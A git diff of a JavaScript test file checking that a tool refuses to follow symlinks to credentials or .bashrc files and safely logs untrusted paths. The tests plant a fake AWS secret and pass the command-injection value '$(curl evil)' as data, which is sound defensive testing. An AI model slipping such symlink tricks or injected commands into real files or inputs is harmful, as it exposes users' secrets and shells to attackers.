@@ -14,7 +14,7 @@ import { appendSentLog } from "../lib/intentdir.js";
 import { sanitize } from "../lib/render.js";
 import { clip, wellFormed } from "../lib/text.js";
 import { createFakeProver, TEST_KEY } from "./helpers/fake-prover.js";
-import { QUIET_GLOBAL, fixture, tmpdir, makeRepo, baseEnv, runHook, saveKey, BIN } from "./helpers/env.js";
+import { symlink, SKIP_FILE_SYMLINKS, QUIET_GLOBAL, fixture, tmpdir, makeRepo, baseEnv, runHook, saveKey, BIN } from "./helpers/env.js";
 
 let fp;
 before(async () => { fp = createFakeProver({ pollsBeforeDone: 0 }); await fp.listen(); });
@@ -60,7 +60,6 @@ test("2. prior artifacts: symlinks and oversized files are not read, contents ar
   fs.writeFileSync(secretFile, `aws_secret_access_key = ${SECRET}\n`);
   const dir = path.join(root, ".intent", "app.py");
   fs.mkdirSync(dir, { recursive: true });
-  fs.symlinkSync(secretFile, path.join(dir, "INTENT.md"));
   fs.writeFileSync(path.join(dir, "SPEC.k"), "x".repeat(70 * 1024));
   fs.writeFileSync(path.join(dir, "SEMANTICS.k"), `token = "${SECRET}"\n`);
   const p = readPrior(root, "app.py");
@@ -69,8 +68,18 @@ test("2. prior artifacts: symlinks and oversized files are not read, contents ar
   assert.ok(!p.semantics_k.includes(SECRET));
   // A symlinked .intent folder is ignored altogether.
   const root2 = tmpdir();
-  fs.symlinkSync(path.join(root, ".intent"), path.join(root2, ".intent"));
+  symlink(path.join(root, ".intent"), path.join(root2, ".intent"));
   assert.equal(readPrior(root2, "app.py"), null);
+});
+
+test("2. prior artifacts: a symlinked INTENT.md is not read", { skip: SKIP_FILE_SYMLINKS }, () => {
+  const root = tmpdir();
+  const secretFile = path.join(tmpdir("intent-home-"), "credentials");
+  fs.writeFileSync(secretFile, `aws_secret_access_key = ${SECRET}\n`);
+  const dir = path.join(root, ".intent", "app.py");
+  fs.mkdirSync(dir, { recursive: true });
+  symlink(secretFile, path.join(dir, "INTENT.md"));
+  assert.equal(readPrior(root, "app.py")?.intent_md ?? null, null);
 });
 
 test("3. baseline uses a temporary index: works with .git/index.lock present, leaves .git/index alone", async () => {
@@ -135,33 +144,36 @@ test("4. clipping never splits a surrogate pair; NUL and lone surrogates are cle
   assert.ok(!json.includes("\\u0000"));
 });
 
-test("5. a symlinked .sent.log is never followed", () => {
+test("5. a symlinked .sent.log is never followed", { skip: SKIP_FILE_SYMLINKS }, () => {
   const root = tmpdir();
   const target = path.join(tmpdir("intent-home-"), ".bashrc");
   fs.writeFileSync(target, "# rc\n");
   fs.mkdirSync(path.join(root, ".intent"));
-  fs.symlinkSync(target, path.join(root, ".intent", ".sent.log"));
+  symlink(target, path.join(root, ".intent", ".sent.log"));
   appendSentLog(root, { time: "t", paths: ["$(curl evil)"] });
   assert.equal(fs.readFileSync(target, "utf8"), "# rc\n");
 });
 
-test("6. an unreachable service never slows a prompt: the request is created off the prompt path", async () => {
+test("6. an unreachable service never slows a prompt: the request is created off the prompt path", async (t) => {
   const sockets = [];
   const hang = http.createServer(() => { /* never answers */ });
   hang.on("connection", (s) => sockets.push(s));
   await new Promise((r) => hang.listen(0, "127.0.0.1", r));
+  // Closed even when an assertion below fails: an open server would keep this test file from ever exiting.
+  t.after(() => { for (const s of sockets) s.destroy(); hang.close(); });
   const url = `http://127.0.0.1:${hang.address().port}`;
   const data = tmpdir("intent-data-");
   fs.writeFileSync(path.join(data, "global.json"), QUIET_GLOBAL);
   const env = baseEnv(data, url);
   const repo = makeRepo().dir;
+  // A prompt that waited on the connect request would take its 1.5 s timeout plus process start-up;
+  // Windows starts a node process more slowly, so its bound is looser but still below that.
+  const FAST = process.platform === "win32" ? 1400 : 600;
   const first = await runHook("prompt", fixture("prompt", repo), env);
-  assert.ok(first.ms < 600, `first took ${first.ms}`);
+  assert.ok(first.ms < FAST, `first took ${first.ms}`);
   const second = await runHook("prompt", fixture("prompt", repo), env);
   const third = await runHook("prompt", fixture("prompt", repo, { session_id: "new-session" }), env);
-  assert.ok(second.ms < 600 && third.ms < 600, `${second.ms} ${third.ms}`);
-  for (const s of sockets) s.destroy();
-  hang.close();
+  assert.ok(second.ms < FAST && third.ms < FAST, `${second.ms} ${third.ms}`);
 });
 
 test("7. sanitiser: invisible characters, tagged regions, lookalikes and social engineering", () => {
